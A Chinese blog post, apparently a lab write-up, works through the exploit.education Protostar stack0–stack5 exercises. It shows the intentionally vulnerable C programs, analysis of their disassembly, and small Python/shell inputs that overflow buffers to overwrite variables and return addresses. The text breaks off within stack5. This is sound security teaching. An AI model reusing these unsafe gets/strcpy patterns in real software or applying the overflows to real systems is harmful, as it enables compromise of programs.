<!doctype html><html lang=zh-cn>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=robots content="noodp">
<meta http-equiv=x-ua-compatible content="IE=edge, chrome=1">
<title>PWN入门实验 - 栖迟於一丘</title><meta name=Description content><meta property="og:title" content="PWN入门实验">
<meta property="og:description" content="0x00 introduction lab site : https://exploit.education/ 0x10 Protostar 0x11 stack 0x111 stack0 可以参考网站给出的源码，也可以直接反汇编得到汇编代码进行分析。 首先是网站给出的源码： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16">
<meta property="og:type" content="article">
<meta property="og:url" content="http://int80.top/23-4-1/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-04-01T00:00:00+00:00">
<meta property="article:modified_time" content="2021-04-01T00:00:00+00:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="PWN入门实验">
<meta name=twitter:description content="0x00 introduction lab site : https://exploit.education/ 0x10 Protostar 0x11 stack 0x111 stack0 可以参考网站给出的源码，也可以直接反汇编得到汇编代码进行分析。 首先是网站给出的源码： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16">
<meta name=application-name content="INT80">
<meta name=apple-mobile-web-app-title content="INT80"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=/mstile-150x150.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=http://int80.top/23-4-1/><link rel=next href=http://int80.top/oslab1/><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"PWN入门实验","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/int80.top\/23-4-1\/"},"genre":"posts","keywords":"PWN","wordcount":7055,"url":"http:\/\/int80.top\/23-4-1\/","datePublished":"2021-04-01T00:00:00+00:00","dateModified":"2021-04-01T00:00:00+00:00","publisher":{"@type":"Organization","name":"ShiDong"},"author":{"@type":"Person","name":"ShiDong"},"description":""}</script></head>
<body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':''==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:''==='dark')&&document.body.setAttribute('theme','dark')</script>
<div id=mask></div><div class=wrapper><header class=desktop id=header-desktop>
<div class=header-wrapper>
<div class=header-title>
<a href=/ title=栖迟於一丘><img class="lazyload logo" src=/svg/loading.min.svg data-src=/1.png data-srcset="/1.png, /1.png 1.5x, /1.png 2x" data-sizes=auto alt=/1.png title=/1.png>INT80</a>
</div>
<div class=menu>
<div class=menu-inner><a class=menu-item href=/posts/> Posts </a><a class=menu-item href=/tags/> Tags </a><a class=menu-item href=/categories/> Categories </a><a class=menu-item href=/aboutme/> About Me </a><a class=menu-item href=/search/><i class="fas fa-fw fa-search"></i> search </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw"></i>
</a>
</div>
</div>
</div>
</header><header class=mobile id=header-mobile>
<div class=header-container>
<div class=header-wrapper>
<div class=header-title>
<a href=/ title=栖迟於一丘><img class="lazyload logo" src=/svg/loading.min.svg data-src=/1.png data-srcset="/1.png, /1.png 1.5x, /1.png 2x" data-sizes=auto alt=/1.png title=/1.png>INT80</a>
</div>
<div class=menu-toggle id=menu-toggle-mobile>
<span></span><span></span><span></span>
</div>
</div>
<div class=menu id=menu-mobile><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/aboutme/ title>About Me</a><a class=menu-item href=/search/ title><i class="fas fa-fw fa-search"></i>search</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw"></i>
</a></div>
</div>
</header>
<div class="search-dropdown desktop">
<div id=search-dropdown-desktop></div>
</div>
<div class="search-dropdown mobile">
<div id=search-dropdown-mobile></div>
</div>
<main class=main>
<div class=container>
<div class=toc id=toc-auto>
<h2 class=toc-title>目录</h2>
<div class=toc-content id=toc-content-auto></div>
</div><article class="page single"><h1 class="single-title animated flipInX">PWN入门实验</h1><div class=post-meta>
<div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>ShiDong</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/pwn/><i class="far fa-folder fa-fw"></i>PWN</a></span></div>
<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-04-01>2021-04-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 7055 字
<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 15 分钟&nbsp;</div>
</div><div class="details toc" id=toc-static kept>
<div class="details-summary toc-title">
<span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span>
</div>
<div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents>
<ul>
<li>
<ul>
<li>
<ul>
<li><a href=#0x00-introduction>0x00 introduction</a></li>
<li><a href=#0x10-protostar>0x10 Protostar</a>
<ul>
<li><a href=#0x11-stack>0x11 stack</a>
<ul>
<li><a href=#0x111-stack0>0x111 stack0</a></li>
<li><a href=#0x112-stack1>0x112 stack1</a></li>
<li><a href=#0x113-stack2>0x113 stack2</a></li>
<li><a href=#0x114-stack3>0x114 stack3</a></li>
<li><a href=#0x115-stack4>0x115 stack4</a></li>
<li><a href=#0x116-stack5>0x116 stack5</a></li>
<li><a href=#0x117-stack6>0x117 stack6</a></li>
<li><a href=#0x116-stack7>0x116 stack7</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</nav></div>
</div><div class=content id=content><h4 id=0x00-introduction>0x00 introduction</h4>
<p>lab site : <a href=https://exploit.education/ target=_blank rel="noopener noreffer">https://exploit.education/</a></p>
<h4 id=0x10-protostar>0x10 Protostar</h4>
<h5 id=0x11-stack>0x11 stack</h5>
<h6 id=0x111-stack0>0x111 stack0</h6>
<p>可以参考网站给出的源码，也可以直接反汇编得到汇编代码进行分析。</p>
<p>首先是网站给出的源码：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span><span class=cp></span>
<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span>
<span class=p>{</span>
  <span class=k>volatile</span> <span class=kt>int</span> <span class=n>modified</span><span class=p>;</span>
  <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>

  <span class=n>modified</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
  <span class=n>gets</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>

  <span class=k>if</span><span class=p>(</span><span class=n>modified</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;you have changed the &#39;modified&#39; variable</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Try again?</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
  <span class=p>}</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>然后是反汇编得到的汇编代码：</p>
<div>
<center>
<img src=1-1.png alt=1-1.png style=100%>
<br>
Picture 1-1
</center>
</div>
<p>0x80483fd - 0x8048409地址处的指令，先将esp+0x5c处置零，然后将esp指向esp+0x1c地址处。</p>
<p>那么0x5c-0x1c刚好为64大小，正好是源码中的buffer的长度。</p>
<p>又在0x8048411和0x8048415两条指令中，将esp+0x5c的值赋给了eax，然后判断eax是否为0，根据结果打印不同的字符串。</p>
<p>我们可以查看在0x8048500和0x8048529两处字符串：</p>
<div>
<center>
<img src=1-2.png alt=1-2.png style=100%>
<br>
Picture 1-2
</center>
</div>
<p>因此可以判段 eax保存的就是源码中的变量modified，因此该变量存在地址esp+0x5c处，也就是和buffer数组紧密相连的。</p>
<p>那么该程序只需要将modified变量的值更改即可完成。</p>
<p>在该程序中有gets函数，这函数因为没有限制输入数据长度，因此会导致栈溢出。那么只要我们一次性输入大于64长度的数据，那么就可以将modified变量给覆盖了。</p>
<div>
<center>
<img src=1-3.png alt=1-3.png style=100%>
<br>
Picture 1-3
</center>
</div>
<p>根据图1-3可以看到modified变量已经被我们的输入覆盖了。并且再改程序return是发生了segmentation fault，而下面发生错误的地址0x616161，正是字符&rsquo;a&rsquo;的ascii码，因此我们输入的长度还覆盖到了返回地址。而0x616161地址是错误的地址，因此当ret指令被执行返回到0x616161时就出现了错误。</p>
<p>因为返回地址所在的栈地址是确定的，因此我们也可以将指定地址覆写，从而实现该栈溢出的利用。</p>
<p>再回看图1-1的 0x80483f7与0x80483fa，esp首先进行了8位对齐，也就是最大变小了0xf(不一定就是变小0xf，可能是0x0-0xf的任何一个数据，我们以0xm为代表)，然后再减去0x60，因此返回地址存储的地址为 esp+0x60+0xm，然后因为buffer数组起始地址又为esp-0x60+0x1c，因此从数组起始地址开始要覆盖到返回地址就需要输入长度为0x60-0x1c+0xm的输入。</p>
<p>通过上述分析，可以画出如下图1-5的栈结构。</p>
<div>
<center>
<img src=1-5.png alt=1-4.png style=100%>
<br>
Picture 1-4
</center>
</div>
<p>经过测试，当输入长度为84的字符串时，返回地址被覆盖，因为是32位地址，因此输入80长度字符串后就可以改变返回地址了。如图例子：</p>
<div>
<center>
<img src=1-4.png alt=1-5.png style=100%>
<br>
Picture 1-5
</center>
</div>
<p>因此当遇到可利用的栈溢出漏洞时，便可以通过计算返回地址所保存的地址，通过溢出覆写该返回地址，从而让程序跳转到我们想让其执行的代码段。</p>
<h6 id=0x112-stack1>0x112 stack1</h6>
<p>首先展示源码:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span><span class=cp></span>
<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span>
<span class=p>{</span>
  <span class=k>volatile</span> <span class=kt>int</span> <span class=n>modified</span><span class=p>;</span>
  <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>

  <span class=k>if</span><span class=p>(</span><span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
      <span class=n>errx</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;please specify an argument</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
  <span class=p>}</span>

  <span class=n>modified</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
  <span class=n>strcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>

  <span class=k>if</span><span class=p>(</span><span class=n>modified</span> <span class=o>==</span> <span class=mh>0x61626364</span><span class=p>)</span> <span class=p>{</span>
      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;you have correctly got the variable to the right value</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Try again, you got 0x%08x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>modified</span><span class=p>);</span>
  <span class=p>}</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>这个程序和stack0的区别在于，gets函数更换成了strcpy函数，同样的，strcpy函数并没有对将要写入的数据进行长度限制，这就可能导致要写入的数据长度大于了写入的数组的长度，从而造成栈溢出。</p>
<p>根据程序表达的意思，该程序的目的同样是要修改掉modified变量的值，但这里要求修改为0x61626364，也就是字符串"dcba"(小端序，高位在高地址，因此0x61在高地址，也就是a在最后)。同样的，反汇编分析出modified变量所处的栈地址，然后计算足够的长度进行覆盖即可。</p>
<p>如图1-6，0x804846d首先先判断argc是否为1，也就是是否输入了一个参数，是的话就跳转到0x8048487，否则就调用errx函数。在0x804848f - 0x8048497中，将输入的参数的数据的地址保存在esp+0x4中，然后在0x804849b-0x804849f中将buffer数组的起始地址保存在esp中，最后调用strcpy。因此此时的esp是buffer数组的起始地址，esp+0x4是输入的字符串参数的保存地址。</p>
<p>在0x80484a7 - 0x80484ab中，取出了esp+0x5c的值来与0x61626364进行比较，因此esp+0x5c正是modified变量的地址。而buffer长度为64(d) = 0x40，0x1C+0x40正好是modified的地址，因此modified也紧跟在buffer数组后。</p>
<div>
<center>
<img src=1-6.png alt=1-6.png style=100%>
<br>
Picture 1-6
</center>
</div>
<p>综上分析，只要输入64个占位符 + “abcd”即可修改modified变量成功。结果如图1-7所示。同样如果要利用该栈溢出漏洞，方法和stack0一样，这里只是多了argv和args参数，只需要计算时多加0x8即可。</p>
<div>
<center>
<img src=1-7.png alt=1-7.png style=100%>
<br>
Picture 1-7
</center>
</div>
<h6 id=0x113-stack2>0x113 stack2</h6>
<p>这一道题和前两道原理是一样的，因此我们迅速讲解。</p>
<p>首先是其源码：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span><span class=cp></span>
<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span>
<span class=p>{</span>
  <span class=k>volatile</span> <span class=kt>int</span> <span class=n>modified</span><span class=p>;</span>
  <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>
  <span class=kt>char</span> <span class=o>*</span><span class=n>variable</span><span class=p>;</span>

  <span class=n>variable</span> <span class=o>=</span> <span class=n>getenv</span><span class=p>(</span><span class=s>&#34;GREENIE&#34;</span><span class=p>);</span>

  <span class=k>if</span><span class=p>(</span><span class=n>variable</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
      <span class=n>errx</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;please set the GREENIE environment variable</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
  <span class=p>}</span>

  <span class=n>modified</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>

  <span class=n>strcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>variable</span><span class=p>);</span>

  <span class=k>if</span><span class=p>(</span><span class=n>modified</span> <span class=o>==</span> <span class=mh>0x0d0a0d0a</span><span class=p>)</span> <span class=p>{</span>
      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;you have correctly modified the variable</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Try again, you got 0x%08x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>modified</span><span class=p>);</span>
  <span class=p>}</span>

<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>与另外两道题区别在于，这里获取输入是通过getenv获取GREENIE的环境变量值。因此我们可以通过export 设置好GREENIE的值。</p>
<p>这里简单分析一下modified值可以发现其还是紧接着buffer数组，因此输入只需要超过64的长度就可以覆盖到modified变量了。</p>
<p>我们通过python文件来简化我们的输入，首先编写如下的python代码为s2.py文件</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>place</span> <span class=o>=</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>64</span>
<span class=n>modified</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x0a\x0d\x0a\x0d</span><span class=s2>&#34;</span>
<span class=n>res</span> <span class=o>=</span> <span class=n>place</span> <span class=o>+</span> <span class=n>modified</span>
<span class=nb>print</span> <span class=n>res</span>
</code></pre></td></tr></table>
</div>
</div><p>然后使用指令:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=nb>export</span> <span class=nv>GREENIE</span><span class=o>=</span><span class=sb>`</span>python s2.py<span class=sb>`</span>
</code></pre></td></tr></table>
</div>
</div><p>那么打印该环境变量结果，以及运行stack2的结果应该如图1-8：</p>
<div>
<center>
<img src=1-8.png alt=1-8.png style=100%>
<br>
Picture 1-8
</center>
</div>
<p>为什么0x0d0a0d0a不显示呢？这是因为"\x0a\x0d" 是两个特殊字符的编码，表示换行符和回车符，其中0xa和0xd就是这两个符号对应的ascii码值。"\x" 是一种特殊的字符序列，用于表示后面跟随的两个十六进制数字所代表的字符。使用 &ldquo;\x&rdquo; 这种特殊字符序列的目的是为了方便地表示一些不可见或难以输入的字符，例如换行符、回车符等。</p>
<h6 id=0x114-stack3>0x114 stack3</h6>
<p>源码:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span><span class=cp></span>
<span class=kt>void</span> <span class=nf>win</span><span class=p>()</span>
<span class=p>{</span>
  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;code flow successfully changed</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
<span class=p>}</span>

<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span>
<span class=p>{</span>
  <span class=k>volatile</span> <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>fp</span><span class=p>)();</span>
  <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>

  <span class=n>fp</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>

  <span class=n>gets</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>

  <span class=k>if</span><span class=p>(</span><span class=n>fp</span><span class=p>)</span> <span class=p>{</span>
      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;calling function pointer, jumping to 0x%08x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fp</span><span class=p>);</span>
      <span class=n>fp</span><span class=p>();</span>
  <span class=p>}</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>在分析这个源码后，可以得出他的目的是让我们将win函数地址覆写到fp指针中，从而打印出win函数里的字符串。</p>
<p>因此我们需要首先确定win函数在该程序中的偏移地址，我们可以通过objdump查看该程序的符号表从而确定该函数的地址：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>objdump -t stack3 <span class=p>|</span> grep win
</code></pre></td></tr></table>
</div>
</div><p>输出如图1-9所示，那么0x8048424就是win函数的起始地址了：</p>
<div>
<center>
<img src=1-9.png alt=1-9.png style=100%>
<br>
Picture 1-9
</center>
</div>
<p>当然也可以通过gdb的p指令查看：</p>
<div>
<center>
<img src=1-11.png alt=1-10.png style=100%>
<br>
Picture 1-10
</center>
</div>
<p>接着对stack3进行反汇编，确定fp函数指针的地址以及buffer的起始地址：</p>
<div>
<center>
<img src=1-10.png alt=1-11.png style=100%>
<br>
Picture 1-11
</center>
</div>
<p>在0x8048449 - 0x8048450可以看到esp+0x1c的地方仍然是buffer的起始地址。而在0x8048455处将esp+5c与0x0进行了对比，也就是判断fp是否为空。因此fp函数指针与buffer也是紧密相连的，那么直接写入覆盖即可。</p>
<p>这里我们通过python把exp写入文本中，然后在gdb中直接使用：</p>
<div>
<center>
<img src=1-12.png alt=1-12.png style=100%>
<br>
Picture 1-12
</center>
</div>
<p>运行结果如图1-13，可以看到win函数已经被执行，并正确打印了字符串：</p>
<div>
<center>
<img src=1-13.png alt=1-13.png style=100%>
<br>
Picture 1-13
</center>
</div>
<p>在stack0中，我们实现了修改ret地址，那么利用效果与这里的相同，通过更改某个地址的调用从而实现调用任意函数，这也是栈溢出的重要危害之一。</p>
<h6 id=0x115-stack4>0x115 stack4</h6>
<p>还是先看源码吧：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span><span class=cp></span>
<span class=kt>void</span> <span class=nf>win</span><span class=p>()</span>
<span class=p>{</span>
  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;code flow successfully changed</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
<span class=p>}</span>

<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span>
<span class=p>{</span>
  <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>

  <span class=n>gets</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>很明显，这个题除了一个gets函数以及一个win函数就没其他东西了，我们也可以直观确定，这个题就是要我们把win函数的这串字符串打印出来。那这个题就需要通过栈溢出来覆盖ret地址进行利用了。</p>
<p>经过前几个题的训练，这个题已经很简单了。计算出main函数返回地址的地址，然后用win函数地址覆盖即可。那么就继续通过汇编来确定返回地址所保存的地址。</p>
<p>首先确定win函数地址：</p>
<div>
<center>
<img src=1-14.png alt=1-14.png style=100%>
<br>
Picture 1-14
</center>
</div>
<p>然后在确定返回地址被保存的地址：</p>
<div>
<center>
<img src=1-15.png alt=1-15.png style=100%>
<br>
Picture 1-15
</center>
</div>
<p>在图1-15中，buffer的起始地址为esp+0x10，而在次之前esp先被进行了8位对齐和减0x50的处理，因此我们可以确定如下的栈结构：</p>
<div>
<center>
<img src=1-16.png alt=1-16.png style=100%>
<br>
Picture 1-16
</center>
</div>
<p>我们可以确定从buffer起始地址到esp&0xfffffff0地址大小为64，但是对齐操作我们需要多次尝试才能确定对齐之前的地址为多少。</p>
<p>通过测试，当输入长度为79时，刚好能够覆盖返回地址：</p>
<div>
<center>
<img src=1-17.png alt=1-17.png style=100%>
<br>
Picture 1-17
</center>
</div>
<p>因此我们需要将win函数的地址从输入长度为76的地方开始写入即可覆盖，由图1-18可以看到，我们成功覆写返回地址，并成功跳转值win函数了：</p>
<div>
<center>
<img src=1-18.png alt=1-18.png style=100%>
<br>
Picture 1-18
</center>
</div>
<h6 id=0x116-stack5>0x116 stack5</h6>
<p>源码：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span><span class=cp></span>
<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span>
<span class=p>{</span>
  <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>

  <span class=n>gets</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>
